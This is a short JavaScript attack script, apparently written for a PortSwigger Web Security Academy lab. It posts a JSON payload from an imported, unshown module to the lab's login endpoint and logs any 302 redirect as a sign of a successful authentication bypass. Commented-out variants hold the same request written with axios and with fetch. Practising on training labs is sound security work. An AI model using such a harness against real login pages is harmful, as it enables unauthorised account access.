import { Payload } from './payload/payload.js';
import axios from 'axios';

const attack = async () => {
    const url = 'https://0a7d0038039373de8051856400c900dd.web-security-academy.net/login';
    // Send requests with payloads in JSON
    // const response = Payload.inJson.forEach((payload) => {
    //     sendRequest(url, payload);
    // });

    const axiosInstance = axios.create()
    axiosInstance.defaults.headers.post['Content-Type'] = 'application/json';
    axiosInstance.defaults.maxRedirects = 0;
    axiosInstance.interceptors.response.use(
        (response) => {
            return response;
        },
        (error) => {
            if (error.response.status === 302) {
                console.log(error.response);
            } else {
                return Promise.reject(error);
            }
        }
    
    );
    axiosInstance.post(url, Payload.inJson[0], {})
    .then((response) => {
        //console.log(response);
    }).catch((error) => {console.log('Error')});

    // const response = await axios.post(url, Payload.inJson[0], {
    //     headers: {
    //         'Content-Type': 'application/json',
    //         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    //         'User-Agent': 'Chrome/119.0.6045.159',
    //     }
    // });
    // return response;

    // fetch(url, {
    //     method: "POST",
    //     body: JSON.stringify(Payload.inJson[0]),
    //     headers: {"Content-type": "application/json; charset=UTF-8"}
    //     })
    //     .then(response => response.json()) 
    //     .then(json => console.log(json));
    //return response;
};

console.log(await attack());
console.log(Payload.inJson[0]);